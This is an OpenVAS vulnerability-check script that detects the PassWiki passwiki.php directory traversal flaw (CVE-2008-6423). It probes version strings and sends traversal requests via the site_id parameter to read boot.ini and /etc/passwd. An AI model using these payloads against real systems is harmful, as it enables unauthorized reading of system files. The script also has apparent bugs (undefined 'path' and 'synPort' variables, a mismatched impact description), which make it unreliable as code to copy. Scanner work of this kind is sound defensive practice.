###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_passwiki_dir_traversal_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# PassWiki passwiki.php Directory Traversal Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attacker to inject arbitrary
  web script or HTML on a affected application.
  Impact Level: Application";
tag_affected = "PassWiki version prior to 0.9.17 on all platforms.";
tag_insight = "Input validation error in site_id parameter in passwiki.php file allows
  arbitrary code injection.";
tag_solution = "Upgrade to version 0.9.17
  http://www.i-apps.net/passwiki";
tag_summary = "This host is running PassWiki and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(900521);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-03-20 07:08:52 +0100 (Fri, 20 Mar 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2008-6423");
  script_bugtraq_id(29455);
  script_name("PassWiki passwiki.php Directory Traversal Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/30496");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/5704");

  script_description(desc);
  script_summary("Check for version/directory traversal in PassWiki");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

pwikiPort = get_kb_item("Services/www");
if(!pwikiPort)
{
  pwikiPort = get_http_port(default:80);
  if(!pwikiPort){
    exit(0);
  }
}

foreach dir (make_list("/passwiki", cgi_dirs()))
{
  sndReq = http_get(item:string(dir,"/passwiki.php"), port:pwikiPort);
  rcvRes = http_keepalive_send_recv(port:pwikiPort, data:sndReq);

  if("PassWiki" >!< rcvRes)
  {
    sndReq = http_get(item:string(dir,"/index.php"), port:pwikiPort);
    rcvRes = http_keepalive_send_recv(port:pwikiPort, data:sndReq);
  }

  if("PassWiki" >< rcvRes)
  {
    if(!safe_checks())
    {
      sndReq1 = http_get(item:path + "/passwiki.php?site_id=../../../" +
                                     "../../../../../../../../../boot.ini",
                         port:pwikiPort);
      rcvRes1 = http_send_recv(port:synPort, data:sndReq1);
      if("boot loader" >< rcvRes1)
      {
        security_hole(pwikiPort);
        exit(0);
      }

      sndReq2 = http_get(item:path + "/passwiki.php?site_id=../../../" +
                                     "../../../../../../../../../etc/passwd",
                         port:pwikiPort);
      rcvRes2 = http_send_recv(port:pwikiPort, data:sndReq2);
      if("root" >< rcvRes2)
      {
        security_hole(pwikiPort);
        exit(0);
      }
    }

    pwikiVer = eregmatch(pattern:"powered by .*PassWiki.* ([0-9]\.[0-9.]+)",
                         string:rcvRes);
    if(pwikiVer[1] != NULL)
    {
      if(version_is_less(version:pwikiVer[1], test_version:"0.9.17"))
      {
        security_warning(pwikiPort);
        exit(0);
      }
    }
    exit(0);
  }
}
